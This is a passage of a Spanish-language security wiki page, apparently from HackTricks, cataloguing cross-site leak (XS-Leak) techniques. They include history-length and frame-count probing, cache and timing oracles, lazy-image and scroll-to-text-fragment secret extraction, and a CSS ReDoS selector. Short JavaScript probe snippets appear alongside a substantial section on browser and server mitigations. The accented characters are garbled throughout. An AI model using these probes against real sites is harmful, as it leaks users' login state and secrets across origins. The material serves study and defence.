Un atacante podr√≠a usar c√≥digo JavaScript para **manipular la ubicaci√≥n del frame/pop-up a una adivinada** e **inmediatamente** **cambiarla a `about:blank`**. Si la longitud del historial aumenta, significa que la URL era correcta y tuvo tiempo de **aumentar porque la URL no se recarga si es la misma**. Si no aumenta, significa que **intent√≥ cargar la URL adivinada** pero debido a que **inmediatamente despu√©s** cargamos **`about:blank`**, la **longitud del historial nunca aument√≥** al cargar la URL adivinada.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Conteo de Marcos

* **M√©todos de Inclusi√≥n**: Marcos, Ventanas emergentes
* **Diferencia Detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumen:** Leer el n√∫mero de marcos (window.length).
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar el **n√∫mero de marcos en una p√°gina web** abierta mediante `iframe` o `window.open` puede ayudar a identificar el **estado del usuario en esa p√°gina**. Adem√°s, si la p√°gina siempre tiene el mismo n√∫mero de marcos, verificar **continuamente** el n√∫mero de marcos puede ayudar a identificar un **patr√≥n** que podr√≠a filtrar informaci√≥n.

Un ejemplo de esta t√©cnica es que en Chrome, un **PDF** se puede **detectar** con el **conteo de marcos** porque se utiliza internamente un `embed`. Hay [Par√°metros de URL abiertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permiten cierto control sobre el contenido, como `zoom`, `view`, `page`, `toolbar`, donde esta t√©cnica podr√≠a ser interesante.

### HTMLElements

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumen:** Leer el valor filtrado para distinguir entre 2 posibles estados
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Algunas p√°ginas web pueden **generar din√°micamente archivos multimedia** seg√∫n la informaci√≥n del usuario o agregar marcas de agua que cambian el tama√±o del medio. Un atacante puede utilizar la informaci√≥n filtrada por esos elementos HTML para distinguir entre posibles estados.

Algunos HTMLElements filtrar√°n informaci√≥n a trav√©s de or√≠genes cruzados, como el tipo de medio que son:

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) filtra la `duraci√≥n` del medio y los tiempos `buffered`.
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) filtra `videoHeight` y `videoWidth`, algunos navegadores tambi√©n pueden tener `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` y `webkitDecodedFrameCount`.
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) filtra `totalVideoFrames`.
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) filtra `height` y `width`, pero si la imagen no es v√°lida, ser√°n 0 y [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) ser√° rechazado.

### Propiedad CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumen:** Detectar el estilo del sitio web seg√∫n el estado del usuario.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Las aplicaciones web pueden cambiar el **estilo del sitio web seg√∫n el estado del usuario**. Los archivos CSS de origen cruzado se pueden incrustar en la p√°gina del atacante con el **elemento de enlace HTML**, y las **reglas** se **aplicar√°n** a la p√°gina del atacante. Si una p√°gina cambia din√°micamente estas reglas, un atacante puede **detectar** estas **diferencias** seg√∫n el estado del usuario.\
Como t√©cnica de filtraci√≥n, el atacante puede utilizar el m√©todo `window.getComputedStyle` para **leer las propiedades CSS** de un elemento HTML espec√≠fico. Como resultado, un atacante puede leer propiedades CSS arbitrarias si se conoce el elemento afectado y el nombre de la propiedad.

### Historial CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumen:** Detectar si se aplica el estilo `:visited` a una URL, indicando que ya ha sido visitada
* **Ejemplo de c√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Seg√∫n [**esto**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), esto no funciona en Chrome sin cabeza.
{% endhint %}

Usando el selector CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited), es posible aplicar un estilo diferente a las URL que han sido visitadas.\
Anteriormente era posible utilizar [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) para detectar esta diferencia, pero ahora los navegadores lo impiden devolviendo siempre valores como si el enlace hubiera sido visitado y limitando los estilos que se pueden aplicar utilizando el selector.\
Por lo tanto, puede ser necesario enga√±ar al usuario para que haga clic en un √°rea en la que el CSS haya afectado esto se puede hacer utilizando [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode).\
Tambi√©n hay formas de hacerlo sin interacci√≥n del usuario, como abusar de los tiempos de renderizado, esto funciona porque lleva tiempo pintar los enlaces de un color diferente.\
Se proporcion√≥ una prueba de concepto en un informe de Chromium que funciona utilizando varios enlaces para aumentar la diferencia de tiempo.
### Fuga de X-Frame del documento de contenido

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Encabezados
* **M√°s informaci√≥n**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumen:** En GC, cuando una p√°gina no est√° permitida para ser incrustada en una p√°gina de origen cruzado debido a **X-Frame-Options, se muestra una p√°gina de error**.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

En Chrome, cuando una p√°gina no est√° permitida para ser incrustada en una p√°gina de origen cruzado, porque el encabezado **X-FrameOptions** (XFO) est√° configurado en deny o same-origin, en su lugar se muestra una **p√°gina de error**. Para los objetos, esta p√°gina de error se puede **detectar verificando la propiedad `contentDocument`**. Por lo general, esta propiedad devuelve null porque no se permite el acceso a un documento incrustado de origen cruzado. Sin embargo, debido a la **representaci√≥n de Chrome** de la p√°gina de error, se devuelve un **objeto de documento vac√≠o** en su lugar. Esto no funciona para iframes ni en otros navegadores. Los desarrolladores pueden olvidar configurar X-Frame-Options para todas las p√°ginas y especialmente las p√°ginas de error a menudo carecen de este encabezado. Como t√©cnica de fuga, un atacante puede diferenciar entre diferentes estados de usuario verificando esto.

### Detecci√≥n de descargas

* **M√©todos de inclusi√≥n**: Marcos, Ventanas emergentes
* **Diferencia detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumen:** El atacante puede detectar descargas utilizando iframes. Si el iframe sigue siendo accesible, significa que el archivo se descarg√≥.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

El encabezado `Content-Disposition` ([`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)) indica si el navegador debe descargar el contenido o mostrarlo en l√≠nea.

Si solo un usuario con sesi√≥n iniciada pudiera **acceder a una p√°gina que descargar√° un archivo** porque est√° utilizando el encabezado. Es posible detectar ese comportamiento.

#### Barra de descarga <a href="#download-bar" id="download-bar"></a>

En los navegadores basados en Chromium, cuando se descarga un archivo, se muestra una vista previa del proceso de descarga **en una barra en la parte inferior**, integrada en la ventana del navegador. Al **monitorear la altura de la ventana**, los atacantes pueden detectar si se abri√≥ la "barra de descarga".

#### Navegaci√≥n de descarga (con iframes) <a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

Otra forma de probar el encabezado [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) es **verificar si ocurri√≥ una navegaci√≥n**. Si una carga de p√°gina provoca una descarga, no se activa una navegaci√≥n y la **ventana permanece dentro del mismo origen**.

#### Navegaci√≥n de descarga (sin iframes) <a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

La misma t√©cnica que la anterior, pero utilizando `window.open` en lugar de iframes.

### Bypass de cach√© HTTP particionada <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de inclusi√≥n**: Ventanas emergentes
* **Diferencia detectable**: Tiempo
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumen:** El atacante puede detectar descargas utilizando iframes. Si el iframe sigue siendo accesible, significa que el archivo se descarg√≥.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Por eso esta t√©cnica es interesante: Chrome ahora tiene **particionamiento de cach√©**, y la clave de cach√© de la p√°gina reci√©n abierta es: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, pero si abro una p√°gina de ngrok y uso fetch en ella, la clave de cach√© ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **clave de cach√© es diferente**, por lo que la cach√© no se puede compartir. Puedes encontrar m√°s detalles aqu√≠: [Ganando seguridad y privacidad mediante la partici√≥n de la cach√©](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Comentario de [**aqu√≠**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un sitio `example.com` incluye un recurso de `*.example.com/resource`, entonces ese recurso tendr√° la **misma clave de cach√©** que si el recurso se solicitara directamente a trav√©s de una navegaci√≥n de nivel superior. Esto se debe a que la clave de cach√© est√° compuesta por el _eTLD+1_ de nivel superior y el _eTLD+1_ del marco.

Debido a que acceder a la cach√© es m√°s r√°pido que cargar un recurso, es posible intentar cambiar la ubicaci√≥n de una p√°gina y cancelarla 20 ms (por ejemplo) despu√©s. Si el origen cambi√≥ despu√©s de la interrupci√≥n, significa que el recurso se almacen√≥ en cach√©.\
O simplemente **enviar algunas solicitudes fetch a la p√°gina potencialmente en cach√© y medir el tiempo que tarda**.

### Redirecci√≥n manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de inclusi√≥n**: API Fetch
* **Diferencia detectable**: Redirecciones
* **M√°s informaci√≥n**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumen:** Es posible determinar si una respuesta a una solicitud fetch es una redirecci√≥n.
* **Ejemplo de c√≥digo**:

![](<../.gitbook/assets/image (652).png>)
### Fetch con AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Tiempo
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumen**: Es posible intentar cargar un recurso y abortar antes de que se cargue. Dependiendo de si se desencadena un error, el recurso se almacen√≥ en cach√© o no.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) se puede combinar con _**fetch**_ y _**setTimeout**_ para detectar si el **recurso est√° en cach√©** y para eliminar un recurso espec√≠fico de la cach√© del navegador. Una caracter√≠stica interesante de esta t√©cnica es que la exploraci√≥n se realiza sin almacenar en cach√© nuevo contenido en el proceso.

### Contaminaci√≥n de scripts

* **M√©todos de inclusi√≥n**: Elementos HTML (script)
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumen**: Cuando se incluye un **script de origen cruzado** en una p√°gina, no es posible leer directamente su contenido. Sin embargo, si un script **utiliza alguna funci√≥n incorporada**, es posible **sobrescribirlas** y leer sus argumentos, lo que podr√≠a **filtrar informaci√≥n valiosa**.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **M√©todos de inclusi√≥n**: Ventanas emergentes
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumen**: Medir el tiempo de ejecuci√≥n de una web utilizando service workers.
* **Ejemplo de c√≥digo**:

1. El atacante registra un service worker en uno de sus dominios (attacker.com).
2. En el documento principal, el atacante emite una navegaci√≥n (window.open) al sitio web objetivo e instruye al Service Worker para que inicie un temporizador.
3. Cuando la nueva ventana comienza a cargarse, el atacante navega la referencia obtenida en el paso 2 a una p√°gina manejada por el Service Worker.
4. Cuando la solicitud realizada en el paso 3 llega al service worker, devuelve una respuesta 204 (No Content), lo que aborta la navegaci√≥n.
5. En este punto, el Service Worker recopila una medida del temporizador iniciado en el paso 2. Esta medida se ve afectada por el tiempo que JavaScript bloque√≥ la navegaci√≥n.

{% hint style="warning" %}
En una medici√≥n de tiempo de ejecuci√≥n, es posible **eliminar** **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Tiempo de Fetch

* **M√©todos de inclusi√≥n**: Fetch API
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumen**: La API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Se pueden utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Tiempo entre ventanas

* **M√©todos de inclusi√≥n**: Ventanas emergentes
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumen**: La API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud utilizando `window.open`. Se pueden utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar f√°cilmente flujos de trabajo con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Con HTML o reinyecci√≥n

Aqu√≠ encontrar√°s t√©cnicas para exfiltrar informaci√≥n de un HTML de origen cruzado **inyectando contenido HTML**. Estas t√©cnicas son interesantes en casos en los que, por alguna raz√≥n, puedes **inyectar HTML pero no puedes inyectar c√≥digo JS**.

### Marcado colgante

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Carga diferida de im√°genes

Si necesitas **exfiltrar contenido** y puedes **agregar HTML antes del secreto**, debes revisar las **t√©cnicas comunes de marcado colgante**.\
Sin embargo, si por alguna raz√≥n **DEBES** hacerlo **car√°cter por car√°cter** (tal vez la comunicaci√≥n se realiza a trav√©s de una coincidencia en la cach√©), puedes utilizar este truco.

Las **im√°genes** en HTML tienen un atributo "**loading**" cuyo valor puede ser "**lazy**". En ese caso, la imagen se cargar√° cuando se vea y no mientras se carga la p√°gina:
```html
<img src=/something loading=lazy >
```
Por lo tanto, lo que puedes hacer es **agregar una gran cantidad de caracteres basura** (por ejemplo, **miles de "W"**) para **llenar la p√°gina web antes del secreto o agregar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Luego, si por ejemplo nuestra **inyecci√≥n aparece antes de la bandera**, la **imagen** se **cargar√°**, pero si aparece **despu√©s** de la **bandera**, la bandera + la basura **evitar√°n que se cargue** (tendr√°s que jugar con la cantidad de basura que colocar). Esto es lo que sucedi√≥ en [**este informe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Otra opci√≥n ser√≠a utilizar el **scroll-to-text-fragment** si est√° permitido:

#### Scroll-to-text-fragment

Sin embargo, haces que el **bot acceda a la p√°gina** con algo como
```
#:~:text=SECR
```
Entonces la p√°gina web ser√° algo como: **`https://victim.com/post.html#:~:text=SECR`**

Donde post.html contiene los caracteres basura del atacante y la imagen de carga lenta, y luego se agrega el secreto del bot.

Lo que har√° este texto es hacer que el bot acceda a cualquier texto en la p√°gina que contenga el texto `SECR`. Como ese texto es el secreto y est√° justo **debajo de la imagen**, la **imagen solo se cargar√° si el secreto adivinado es correcto**. As√≠ que ah√≠ tienes tu or√°culo para **filtrar el secreto car√°cter por car√°cter**.

Algunos ejemplos de c√≥digo para explotar esto: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Carga lenta de im√°genes basada en el tiempo

Si **no es posible cargar una imagen externa** que pueda indicar al atacante que la imagen se carg√≥, otra opci√≥n ser√≠a intentar **adivinar el car√°cter varias veces y medir eso**. Si la imagen se carga, todas las solicitudes tomar√°n m√°s tiempo que si la imagen no se carga. Esto es lo que se utiliz√≥ en la [**soluci√≥n de este informe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqu√≠:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si se utiliza `jQuery(location.hash)`, es posible averiguar a trav√©s del tiempo si existe alg√∫n contenido HTML, esto se debe a que si el selector `main[id='site-main']` no coincide, no es necesario verificar el resto de los **selectores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inyecci√≥n de CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defensas

En esta secci√≥n puedes encontrar parte de las mitigaciones recomendadas en [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), sin embargo, hay m√°s mitigaciones en cada secci√≥n de la wiki [https://xsleaks.dev/](https://xsleaks.dev/). Echa un vistazo all√≠ para obtener m√°s informaci√≥n sobre c√≥mo protegerse contra estas t√©cnicas.

### Mitigaciones del M√©todo de Inclusi√≥n

* **Elementos HTML**. Puede utilizar el **encabezado CORP para controlar si las p√°ginas pueden incrustar un recurso**. CORP puede establecerse en same-origin o same-site y bloquea cualquier solicitud de origen cruzado o de sitio cruzado a ese recurso. En el **lado del cliente**, los navegadores basados en Chromium utilizan el algoritmo **CORB** para decidir si se deben permitir o denegar las solicitudes de recursos de origen cruzado.
* **Marcos**. La principal defensa para **evitar que los elementos iframe** carguen recursos HTML es el uso de **X-Frame-Options**. Alternativamente, la directiva **frame-ancestors de CSP** puede lograr un resultado similar. Si se niega la incrustaci√≥n, el m√©todo de inclusi√≥n no puede detectar una diferencia en las respuestas.
* **Ventanas emergentes**. Para restringir el acceso a `window.opener`, el encabezado de respuesta HTTP **COOP** define tres valores diferentes: unsafe-none (predeterminado), same-origin-allow-popups y same-origin. Estos valores se pueden utilizar para **aislar las pesta√±as de navegaci√≥n y las ventanas emergentes** y, por lo tanto, mitigar las t√©cnicas de filtraci√≥n basadas en ventanas emergentes.
* **Solicitudes de JavaScript**. Las solicitudes de JavaScript de origen cruzado se utilizan a menudo en ataques de XS-Leak, porque un atacante tiene un control detallado sobre la solicitud emitida. Sin embargo, dado que estas solicitudes no tienen habilitado CORS, est√°n sujetas a las mismas restricciones que las solicitudes enviadas por elementos HTML, como scripts o im√°genes. Por lo tanto, el impacto de esta t√©cnica de filtraci√≥n tambi√©n se puede **mitigar mediante CORP y CORB**.

M√©todos m√°s gen√©ricos:

* **Metadatos de b√∫squeda**. Estas cabeceras de solicitud permiten a los propietarios del servidor comprender mejor c√≥mo el navegador del usuario caus√≥ una solicitud espec√≠fica. En Chrome, las cabeceras Sec-Fetch-\* se agregan autom√°ticamente a cada solicitud y proporcionan metadatos sobre la procedencia de la solicitud. Por ejemplo, Sec-Fetch-Dest: image se activ√≥ desde un elemento de imagen. Las aplicaciones web pueden elegir bloquear solicitudes en funci√≥n de esa informaci√≥n.
* **Cookies Same-Site**. La marca Same-Site en las cookies permite a los sitios web declarar **si una cookie debe estar restringida al mismo sitio o al contexto de primer nivel**. Todos los principales navegadores admiten cookies Same-Site. En Chrome, las cookies sin el atributo ahora son Lax de forma predeterminada. Para XS-Leaks, **las cookies Same-Site limitan dr√°sticamente las posibilidades de ataque de filtraci√≥n**. Por otro lado, las t√©cnicas de filtraci√≥n que dependen de **`window.open` a√∫n funcionan con `SameSite=Lax`**. Los sitios web que utilizan **otros m√©todos de autenticaci√≥n**, como certificados en el lado del cliente y autenticaci√≥n HTTP, **siguen siendo vulnerables**.
* **Desvinculaci√≥n de Identificadores de Origen Cruzado (COIU)**. COIU, tambi√©n conocido como Aislamiento de Primera Parte (FPI), es una funci√≥n de seguridad opcional que los usuarios pueden habilitar en la configuraci√≥n avanzada de FF (about:config) y que se introdujo inicialmente en el navegador Tor. En un sentido abstracto, es un contexto de mismo sitio extendido. **Vincula m√∫ltiples recursos** (por ejemplo, cookies, cach√©, almacenamiento en el lado del cliente) **a la primera parte** en lugar de compartirlos entre todos los sitios web visitados. Si se habilita, COIU disminuye dr√°sticamente la aplicabilidad de XS-Leaks, ya que solo son posibles los m√©todos que utilizan ventanas emergentes para cumplir con el requisito de primera parte de la pol√≠tica.
* **Protecciones de seguimiento**. Apple implement√≥ un mecanismo de privacidad llamado **Prevenci√≥n de seguimiento inteligente (ITP)** en SA que tiene como objetivo combatir el seguimiento entre sitios limitando las capacidades de las cookies y otras API web. En versiones m√°s recientes de SA, ITP bloquea todas las cookies de terceros de forma predeterminada sin excepciones \[74]. Este bloqueo evita todas las filtraciones que no se basan en ventanas emergentes. FF adopt√≥ un enfoque similar con la Prevenci√≥n de seguimiento mejorada (ETP), pero solo bloquean cookies de terceros espec√≠ficas pertenecientes a proveedores de seguimiento. En el contexto de XS-Leaks, ETP solo mitiga las t√©cnicas de filtraci√≥n que apuntan a estos dominios de seguimiento.
* **Extensiones del navegador**. Los usuarios conscientes de la seguridad pueden utilizar **extensiones del navegador para prevenir ciertos m√©todos de inclusi√≥n**.

### Mitigaciones de T√©cnicas de Filtraci√≥n

* **Controlador de eventos**. La **mitigaci√≥n m√°s efectiva** para esta t√©cnica de filtraci√≥n ser√≠a **denegarlos todos**, pero esto romper√≠a la mayor√≠a de las aplicaciones web en Internet. Por lo tanto, proponemos **reducir la cantidad de informaci√≥n necesaria que se puede recopilar dentro de los eventos**. Por ejemplo, el evento de violaci√≥n de CSP no debe contener la URL de destino de redirecci√≥n en el campo blockedURI. Este comportamiento est√° implementado en FF y en versiones m√°s recientes de GC, solo SA sigue siendo vulnerable.
* **Mensajes de error**. Para mitigar las filtraciones de XS-Leaks basadas en la t√©cnica de filtraci√≥n de mensajes de error, hay dos requisitos principales. En primer lugar, **los mensajes de error no deben contener informaci√≥n detallada**, de manera similar a los mensajes de controlador de eventos. En segundo lugar, los navegadores deben **minimizar la aparici√≥n de mensajes de error**. XS-Leaks como SRI Error, ContentDocument XFO o Fetch Redirect detectan si se lanza un mensaje de error o no.
* **L√≠mites globales**. La correcci√≥n de las t√©cnicas de filtraci√≥n que abusan de los l√≠mites globales es relativamente compleja porque se basan en restricciones f√≠sicas. La recomendaci√≥n general es **restringir los l√≠mites globales en funci√≥n de cada sitio de manera peque√±a**. Si el l√≠mite global es 1, como en el caso de la API de pago, el atacante puede intentar activar silenciosamente la interfaz de pago web en cualquier momento, lo cual solo tiene √©xito si la interfaz no se est√° utilizando simult√°neamente en ninguna otra pesta√±a. Recomendamos acceder a la API de pago solo cuando se haya utilizado un evento confiable. De esta manera, el l√≠mite global se establece en cero a menos que el usuario d√© su consentimiento, como un clic izquierdo del mouse en una ventana de di√°logo, lo que establece el l√≠mite global en uno.
* **Estado global**. **No se debe acceder a ninguna propiedad del estado global del navegador**. Por ejemplo, FF es el √∫nico navegador que actualiza el historial del estado global cuando ocurre una redirecci√≥n, lo que resulta en la lectura de history.length. Los navegadores deben crear una nueva propiedad de historial cuando ocurre una redirecci√≥n en lugar de almacenarla globalmente. Otros ejemplos son los recursos compartidos, como las cach√©s. Las filtraciones de cach√© abusan de la cach√© compartida utilizada para todos los sitios web abiertos en un navegador. Para mitigar por completo las t√©cnicas de filtraci√≥n de cach√©, la cach√© HTTP debe estar particionada en funci√≥n de cada sitio, como lo implementan SA, GC y FF. Tenga en cuenta que en SA, los iframes no se ven afectados por la partici√≥n de la cach√©.
* **API de rendimiento**. Demostramos que la API de rendimiento es una excelente t√©cnica de filtraci√≥n. En muchos XS-Leaks, pudimos detectar la diferencia entre si la respuesta de una solicitud de origen cruzado tiene o no una entrada de rendimiento. Como unificaci√≥n, recomendamos asegurarnos de que todas las solicitudes creen dicha entrada y que solo se registre el subconjunto correcto de informaci√≥n de temporizaci√≥n para las solicitudes de origen cruzado.
## Referencias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

